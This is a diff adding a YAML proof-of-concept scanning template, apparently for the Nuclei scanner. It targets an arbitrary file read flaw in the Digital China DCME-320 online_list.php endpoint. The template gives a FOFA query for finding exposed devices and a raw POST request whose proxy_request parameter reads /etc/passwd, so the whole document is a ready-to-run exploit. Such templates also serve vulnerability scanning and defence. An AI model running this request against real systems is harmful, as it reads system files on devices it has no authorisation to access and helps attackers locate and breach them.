@@ -1,0 +1,26 @@
+id: poc-pttcit8nkxvt09fg
+info:
+  name: 神州数码DCME-320 online_list.php 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pttcit8nkxvt09fg'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pttcit8nkxvt09fg
+    fofa: body="style/blue/css/dcn_ui.css"
+http:
+- raw:
+  - 'POST /function/auth/user/online_list.php HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+
+    proxy_request=/etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
